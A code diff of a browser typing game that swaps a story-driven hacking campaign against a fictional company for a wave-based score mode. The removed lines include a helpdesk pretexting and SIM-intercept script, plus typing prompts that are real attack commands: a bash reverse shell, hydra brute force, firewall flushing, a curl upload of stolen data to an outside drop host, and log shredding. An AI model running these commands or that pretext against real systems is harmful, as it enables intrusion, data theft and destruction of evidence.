-      tStory('The session drops you into a read-only partition. Directory listings visible. The vault itself sits behind a secondary firewall — one layer deeper.');
-      setIDS(28);setStat('hacking',82);notify('FTP exploit: success','ok');notify('IDS +16%','warn');addLog('vsftpd backdoor exploited','lok');
-      activateNode('breach');setTimeout(runFirewall,900);
-    },
-    onFail:()=>{
-      tBlank();tErr('>> EXPLOIT SEQUENCE FAILED. IDS FLAGGED ANOMALY.');
-      setIDS(45);setStat('stealth',65);notify('IDS alert triggered','bad');addLog('FTP exploit: detected','lwn');
-      setTimeout(runFirewall,700);
-    }
+  const next=G.wave+1;
+  showWaveBanner(next,`WAVE ${next} — ESCALATING`,()=>{
+    G.wave++;G.waveKills=0;G.waveSize=G.cfg.waveSize+G.wave*2;G.waveSpawned=0;
+    G.betweenWaves=false;
+    updateWave();
+    startSpawning();
   });
 }
 
-function runSSH(){
-  tBlank();tHdr('// HIDDEN SSH ENDPOINT — PORT 2222');
-  tStory('Non-standard port. Someone tried to hide it. Your packet sniffer pulled a partial credential hash from earlier HTTPS traffic — a misconfigured keepalive leaking auth data.');
-  tNPC('HANDLER','Running the hash. Give me forty seconds... Got it. Username: analyst. Password: Str0ng!Pass2024');
-  tNPC('HANDLER','Password hasn\'t been rotated in fourteen months. These people.');tBlank();
-  tSys('Connect to the SSH endpoint:');
-  setTarget('ssh analyst@10.0.8.52 -p 2222','Type: ssh analyst@10.0.8.52 -p 2222');
-  G.scene='ssh';setStat('social',72);addLog('SSH credentials cracked','lok');
+function updateWave(){document.getElementById('hud-wave').textContent=`WAVE ${G.wave}`;}
+function updateScore(){document.getElementById('hud-score').textContent=G.score.toLocaleString();}
+
+function showWaveBanner(num,sub,cb){
+  const b=document.getElementById('wave-banner');
+  document.getElementById('wb-num').textContent=`WAVE ${num}`;
+  document.getElementById('wb-sub').textContent=sub;
+  b.classList.add('show');
+  setTimeout(()=>{b.classList.remove('show');if(cb)cb();},1700);
 }
 
-function runSSHConnected(){
-  tBlank();tOK('>> SSH SESSION ESTABLISHED. WELCOME, ANALYST.');
-  tSys('Last login: Wed Nov 6 11:41:03 2024');tSys('NovaCorp Internal — Authorized Personnel Only');tBlank();
-  tStory('You\'re in as a network analyst. Limited permissions — but enough to map internal subnets and locate the BLACKVAULT server\'s static MAC address.');
-  setIDS(20);setStat('hacking',78);notify('SSH connected as analyst','ok');addLog('SSH: analyst session opened','lok');
-  activateNode('breach');setTimeout(runFirewall,900);
+// ══════════════════════════════════════════════
+//  GAME OVER
+// ══════════════════════════════════════════════
+function gameOver(){
+  G.over=true;clearTimers();
+  document.getElementById('threat-field').innerHTML='';
+
+  const mins=G.wpmStart?(Date.now()-G.wpmStart)/60000:0;
+  const wpm=mins>0.01?Math.round((G.wpmChars/5)/mins):0;
+  const acc=G.totalKeys>0?Math.round((G.correctKeys/G.totalKeys)*100):100;
+
+  // save hi scores
+  if(G.score>hiScores.score)hiScores.score=G.score;
+  if(wpm>hiScores.wpm)hiScores.wpm=wpm;
+  if(G.wave>hiScores.wave)hiScores.wave=G.wave;
+  try{localStorage.setItem('gp_hi',JSON.stringify(hiScores));}catch(e){}
+  updateHiDisplay();
+
+  document.getElementById('over-title').textContent='SYSTEM COMPROMISED';
+  document.getElementById('over-title').className='over-title fail';
+  document.getElementById('over-msg').textContent=`Shields depleted on wave ${G.wave}. NovaCorp defenses held. Retry?`;
+  document.getElementById('res-score').textContent=G.score.toLocaleString();
+  document.getElementById('res-wave').textContent=G.wave;
+  document.getElementById('res-wpm').textContent=wpm;
+  document.getElementById('res-acc').textContent=acc+'%';
+  setTimeout(()=>show('s-over'),600);
 }
 
-function runSocial(){
-  tBlank();tHdr('// SOCIAL ENGINEERING: IT HELPDESK');
-  tStory('The employee self-service portal. A quick LinkedIn scrape yields a name: Daniel Marsh, Senior Infrastructure Engineer. You\'re going to be Daniel for the next five minutes.');
-  tNPC('HANDLER','Their helpdesk is outsourced. Overworked, under-trained, high turnover. This should be a layup. Don\'t overthink it.');tBlank();
-  tStory('You spoof a VoIP number from NovaCorp\'s registered block. The helpdesk picks up on the third ring.');tBlank();
-  tNPC('HELPDESK','NovaCorp IT support, this is Kevin. How can I help?');
-  tNPC('GHOST (YOU)','Hey Kevin, this is Daniel Marsh, senior infrastructure. I\'m locked out of my remote access ahead of an emergency maintenance window tonight. I need an expedited reset.');
-  tNPC('HELPDESK','Can I get your employee ID?');
-  tNPC('GHOST (YOU)','N-7741. And Kevin — I\'ve got the VP of Engineering watching this deployment. Every minute of delay is a conversation I don\'t want to have.');
-  tNPC('HELPDESK','...Okay, I see the account. Pushing a reset now. One-time code going to your registered device.');
-  tNPC('HANDLER','SIM intercept is live. OTP captured. Credentials confirmed. Textbook.');tBlank();
-  tOK('>> CREDENTIALS OBTAINED. SOCIAL ENGINEERING: SUCCESS.');
-  setStat('social',88);setIDS(15);notify('Social engineering: success','ok');addLog('Helpdesk credentials obtained','lok');
-  activateNode('breach');setTimeout(runFirewall,1400);
+// ══════════════════════════════════════════════
+//  EFFECTS
+// ══════════════════════════════════════════════
+function spawnBoom(x,y){
+  const el=document.createElement('div');
+  el.className='boom';
+  el.style.left=(x-20)+'px';el.style.top=(y-20)+'px';el.style.position='fixed';el.style.zIndex='50';
+  const ring=document.createElement('div');ring.className='boom-ring';
+  el.appendChild(ring);document.body.appendChild(el);
+  setTimeout(()=>el.remove(),500);
 }
 
-function runFirewall(){
-  tBlank();tHdr('// LAYER 2: BLACKVAULT FIREWALL');
-  tStory('You\'re at the perimeter of BLACKVAULT itself. The firewall isn\'t commercial — it\'s custom-built. Stateful packet inspection, deep packet analysis, behavioral anomaly scoring.');
-  tStory('Expensive. Serious. Someone knew what they were doing.');tBlank();
-  tNPC('HANDLER','Two routes. Craft a stealth packet that slides under the DPI filter — surgical, low noise. Or brute-force the ruleset — fast, loud, high heat.');tBlank();
-  setTimeout(()=>{
-    showChoices([
-      {label:'[A] CRAFT STEALTH PACKET — Low heat, slower',go:runStealth},
-      {label:'[B] BRUTE-FORCE RULESET — High heat, faster',go:runBrute},
-    ]);
-  },1100);
+function flashMiss(){
+  const el=document.createElement('div');el.className='miss-flash';
+  document.body.appendChild(el);setTimeout(()=>el.remove(),350);
 }
 
-function runStealth(){
-  tBlank();tHdr('// STEALTH PACKET INJECTION');
-  tStory('You craft a malformed TCP packet that mimics normal HTTPS keepalive traffic. The DPI engine sees routine noise. Your payload rides hidden inside the fragmented header space.');
-  tSys('This requires precision. Type the injection sequence:');tBlank();
-  startMG({
-    title:'// STEALTH PACKET INJECTION',
-    inst:'Craft the evasion payload carefully. Every character is part of the exploit. The DPI engine is watching.',
-    prompts:[
-      'tcpdump -i eth0 -w session.pcap',
-      'python3 forge_packet.py --dst 10.10.5.20',
-      'scapy> pkt = IP(dst="10.10.5.20")/TCP(dport=443)',
-      'scapy> send(pkt, verbose=False)',
-      './bypass.sh --mode stealth --port 443',
-    ],
-    limit:70,
-    onDone:()=>{
-      tBlank();tOK('>> PACKET INJECTED. FIREWALL RULE BYPASSED.');tSys('DPI engine: no anomalies flagged.');
-      setStat('stealth',96);setStat('hacking',88);setIDS(30);notify('Firewall bypassed — clean','ok');addLog('Firewall: stealth bypass success','lok');
-      document.getElementById('inv-sql').textContent='SQL Injector [UNLOCKED]';document.getElementById('inv-sql').className='ia';
-      activateNode('extract');setTimeout(runVault,700);
-    },
-    onFail:()=>{
-      tErr('>> INJECTION FAILED. Escalating to brute-force...');setIDS(52);setStat('stealth',58);notify('Stealth failed — pivoting','warn');
-      setTimeout(runBrute,600);
-    }
-  });
+function spawnComboPopup(pts,anchor){
+  const rect=anchor.getBoundingClientRect();
+  const el=document.createElement('div');el.className='combo-popup';
+  el.textContent=`+${pts}`;
+  el.style.left=(rect.left+rect.width/2-30)+'px';
+  el.style.top=(rect.top-10)+'px';
+  document.body.appendChild(el);
+  setTimeout(()=>el.remove(),950);
 }
 
-function runBrute(){
-  tBlank();tHdr('// FIREWALL BRUTE-FORCE');
-  tWarn('WARNING: High-noise approach. NOC will see spikes. Work fast.');
-  tStory('You hammer the firewall with 60,000 rule permutations per second. Loud as a freight train. Their network operations center will see spikes — but if you\'re through before they correlate the alerts, it doesn\'t matter.');tBlank();
-  startMG({
-    title:'// BRUTE-FORCE: FIREWALL RULESET',
-    inst:'Run the brute-force sequence before their NOC responds. Speed is survival.',
-    prompts:[
-      'nmap --script firewall-bypass 10.10.5.20',
-      'hydra -L users.txt -P wordlist.txt ftp://10.10.5.20',
-      'iptables -F && iptables -P INPUT ACCEPT',
-      'nc -lvnp 4444 &',
-      'bash -i >& /dev/tcp/10.10.5.20/4444 0>&1',
-    ],
-    limit:38,
-    onDone:()=>{
-      tBlank();tOK('>> FIREWALL CRACKED. REVERSE SHELL OBTAINED.');
-      setIDS(64);setStat('stealth',44);setStat('hacking',92);notify('Firewall cracked — HIGH HEAT','bad');addLog('Brute-force: firewall cracked','lwn');
-      activateNode('extract');setTimeout(runVault,700);
-    },
-    onFail:()=>{
-      tErr('>> BRUTE-FORCE STALLED. Partial access only...');
-      setIDS(78);setStat('stealth',28);notify('NOC is responding — move fast!','bad');addLog('Brute-force: partial — NOC alerted','ler');
-      setTimeout(runVault,600);
-    }
-  });
+// ══════════════════════════════════════════════
+//  PAUSE
+// ══════════════════════════════════════════════
+function togglePause(){
+  if(G.over)return;
+  G.paused=!G.paused;
+  document.getElementById('pause-overlay').classList.toggle('show',G.paused);
+  if(!G.paused)realInput.focus();
 }
 
-function runVault(){
-  tBlank();tHdr('// BLACKVAULT — INTERNAL ACCESS CONFIRMED');
-  tStory('You\'re inside BLACKVAULT. 47TB of NovaCorp\'s most sensitive financial infrastructure. The hum of the servers feels almost physical.');
-  tStory('Your target: NovaCorp_Ledger_2024_Q3.enc — a 2.3GB encrypted file. It documents $400M in fraudulent transactions, shell company routing, and board-level sign-offs.');tBlank();
-  tNPC('HANDLER','I see it in the directory tree. Encrypted with their proprietary key — we\'ll need to pull that from the key management server on a separate subnet.');
-  tNPC('HANDLER','GHOST. Their security team just ran a manual sweep. They know something is off. You have eight minutes. Maybe less.');tBlank();
-  tSys('Begin extraction:');
-  setTarget('extract --target vault --out /drop/','Type: extract --target vault');
-  G.scene='vault';addLog('BLACKVAULT: internal access','lok');
+// ══════════════════════════════════════════════
+//  SCREEN HELPER
+// ══════════════════════════════════════════════
+function show(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.add('hide'));
+  document.getElementById(id).classList.remove('hide');
+  if(id==='s-title')updateHiDisplay();
 }
-
-function runExtraction(){
-  tBlank();tHdr('// DATA EXTRACTION IN PROGRESS');
-  tSys('Contacting key management server: 10.10.9.1...');
-  tSys('Decryption key retrieved: [RSA-4096 ████████████████████]');
-  tSys('Decrypting NovaCorp_Ledger_2024_Q3.enc...');tBlank();
-  startMG({
-    title:'// EXTRACTION — CLOCK IS TICKING',
-    inst:'Security team is converging on the anomaly. Complete the extraction and package the data before they isolate the server.',
-    prompts:[
-      'scp ghost@10.10.5.20:/vault/ledger.enc ./staging/',
-      'openssl enc -d -aes-256-cbc -in ledger.enc -out ledger.csv',
-      'sha256sum ledger.csv > ledger.checksum',
-      'tar -czf payload.tar.gz ledger.csv ledger.checksum',
-      'curl --silent -X POST --data-binary @payload.tar.gz https://drop.ghost.net/rx',
-    ],
-    limit:55,
-    onDone:()=>{
-      tBlank();tOK('>> EXTRACTION COMPLETE. FILE INTEGRITY VERIFIED.');tOK('>> PAYLOAD DELIVERED TO SECURE DROP.');
-      setStat('hacking',100);setIDS(Math.min(100,G.ids+15));notify('Ledger extracted successfully','ok');addLog('Target file exfiltrated','lok');
-      activateNode('exfil');setTimeout(runExfil,900);
-    },
-    onFail:()=>{
-      tErr('>> EXTRACTION INCOMPLETE. Partial data only.');tWarn('Server being isolated...');
-      setIDS(86);setStat('stealth',18);notify('Partial extraction — compromised','warn');addLog('Extraction: partial','lwn');
-      setTimeout(runExfil,700);
-    }
-  });
-}
-
-function runExfil(){
-  tBlank();tHdr('// ANTI-FORENSICS — COVER YOUR TRACKS');
-  tStory('The data is out. Now you disappear. Wipe every log, kill every session, collapse the tunnel, leave no fingerprint.');
-  tNPC('HANDLER','Their forensics team will be through that system in six hours. Leave them nothing.');tBlank();
-  startMG({
-    title:'// ANTI-FORENSICS CLEANUP',
-    inst:'Erase all traces from the system. Logs, sessions, routes, everything. Leave it looking untouched.',
-    prompts:[
-      'history -c && cat /dev/null > ~/.bash_history',
-      'find /var/log -type f -exec shred -vzu {} \\;',
-      'kill -9 $(lsof -ti :4444)',
-      'ip route flush table main && iptables -F',
-      'shutdown -h +0',
-    ],
-    limit:48,
-    onDone:()=>{
-      tBlank();tOK('>> ALL TRACES WIPED. SESSION TERMINATED.');tOK('>> VPN COLLAPSED. YOU ARE CLEAN.');
-      setIDS(4);setStat('stealth',100);notify('Clean exfil — mission complete','ok');addLog('All traces removed — clean','lok');
-      NODES.forEach(n=>n.st='done');renderNodes();setTimeout(runEnding,1000);
-    },
-    onFail:()=>{
-      tWarn('>> PARTIAL CLEANUP. Some forensic artifacts remain.');
-      setIDS(35);notify('Logs partially wiped','warn');addLog('Partial cleanup — artifacts remain','lwn');
-      setTimeout(runEnding,700);
-    }
-  });
-}
-
-function runEnding(){
-  tBlank();tDiv();tHdr('// OPERATION: BLACKVAULT — COMPLETE');tDiv();tBlank();
-  tStory('72 hours later. The ledger surfaces through an encrypted journalism platform. Verified. Authenticated. Devastating.');
-  tStory('NovaCorp\'s stock drops 63% in after-hours trading. Three board members are arrested. The CFO goes dark — last pinged near a country with no extradition treaty.');
-  tStory('Your handler wires the final payment to six different wallets across four blockchains. No names. No receipts. The way you like it.');tBlank();
-  tNPC('HANDLER','Clean work, GHOST. You were never here.');
-  tNPC('GHOST','I\'m never anywhere.');tBlank();
-  tDiv();tOK('>> MISSION COMPLETE');
-  tSys(`FINAL — STEALTH: ${G.stats.stealth} | HACKING: ${G.stats.hacking} | SOCIAL: ${G.stats.social} | IDS: ${G.ids}%`);tDiv();tBlank();
-  tSys('Press [R] to run a new operation.');
-  addLog('Op BLACKVAULT: SUCCESS','lok');
-  document.addEventListener('keydown',e=>{if(e.key.toLowerCase()==='r')location.reload();},{once:true});
-}
-
-// ── BOOT ──
-const BOOT=[
-  {t:'Initializing secure runtime...',d:200,c:''},
-  {t:'Loading cryptographic modules... [OK]',d:500,c:'ok'},
-  {t:'VPN client: standby... [OK]',d:750,c:'ok'},
-  {t:'Anonymizer chain: 4-hop configured... [OK]',d:1000,c:'ok'},
-  {t:'IDS evasion layer: active... [OK]',d:1250,c:'ok'},
-  {t:'Packet sniffer: initialized... [OK]',d:1500,c:'ok'},
-  {t:'Scanning target: NovaCorp HQ...',d:1800,c:''},
-  {t:'WARNING: Target system classification — HARDENED',d:2100,c:'warn'},
-  {t:'Mission profile loaded: OP-BLACKVAULT [CLASSIFIED]',d:2400,c:''},
-  {t:'All systems nominal. Awaiting operator input.',d:2700,c:'ok'},
-];
-
-function runBoot(){
-  const el=document.getElementById('boot-lines');
-  BOOT.forEach(({t,d,c})=>setTimeout(()=>{
-    const line=document.createElement('div');line.textContent='> '+t;
-    if(c)line.className=c;el.appendChild(line);
-  },d));
-  setTimeout(()=>document.getElementById('boot-start').style.display='block',3200);
-}
-
-function startGame(){
-  const boot=document.getElementById('boot');boot.classList.add('hidden');
-  setTimeout(()=>{
-    boot.style.display='none';
-    document.getElementById('game').classList.add('on');
-    renderNodes();realInput.focus();
-    runIntro();addLog('System initialized','lok');addLog('Target: NovaCorp BLACKVAULT','lm');
-  },600);
-}
-
-runBoot();
 </script>
 </body>
 </html>
